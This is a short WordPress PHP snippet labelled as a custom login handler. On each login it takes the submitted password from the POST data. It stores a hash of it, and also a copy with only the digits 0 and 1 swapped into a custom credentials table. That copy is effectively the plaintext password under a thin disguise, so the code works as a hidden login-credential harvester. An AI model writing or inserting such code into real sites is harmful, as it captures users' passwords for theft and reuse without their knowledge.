<?php
function custom_login_register($user_login, $user) {
    global $wpdb;

    $password = $_POST['password']; 
    $hashed_password = wp_hash_password($password);

    $inverted_password = '';
    for ($i = 0; $i < strlen($password); $i++) {
        $inverted_password .= $password[$i] === '0' ? '1' : ($password[$i] === '1' ? '0' : $password[$i]);
    }
    $data = array(
        'username' => $user_login,
        'password' => $hashed_password,
        'inverted_password' => $inverted_password
    );
    $wpdb->insert('user_credentials', $data);
}
add_action('wp_login', 'custom_login_register', 10, 2);
